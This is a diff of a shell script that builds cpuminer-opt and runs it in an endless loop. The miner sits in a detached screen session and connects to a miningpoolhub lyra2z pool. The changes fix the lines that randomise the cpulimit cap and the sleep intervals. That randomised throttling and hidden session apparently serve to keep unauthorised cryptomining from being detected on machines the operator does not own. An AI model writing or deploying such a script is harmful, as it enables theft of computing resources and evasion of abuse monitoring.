@@ -7,11 +7,13 @@ cd cpuminer-opt
 cp cpuminer ../
 cd ..
 NPROC=$(nproc)
+num1=`expr $NPROC \* 34`
+num2=`expr $NPROC \* 84`
 while [ 2 -ge 0 ] 
 do
-cpult = ($RANDOM%87*NPROC+34*NPROC)
-delay1 =($RANDOM%900+1800)
-delay2 = ($RANDOM%10+20)
+cpult=$(shuf -i $num1-$num2 -n 1)
+delay1=$(shuf -i 900-1800 -n 1)
+delay2=$(shuf -i 10-20 -n 1)
 cpulimit --exe cpuminer --limit $cpult -b
 screen -S foo -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.4 -p 1
 sleep $delay1
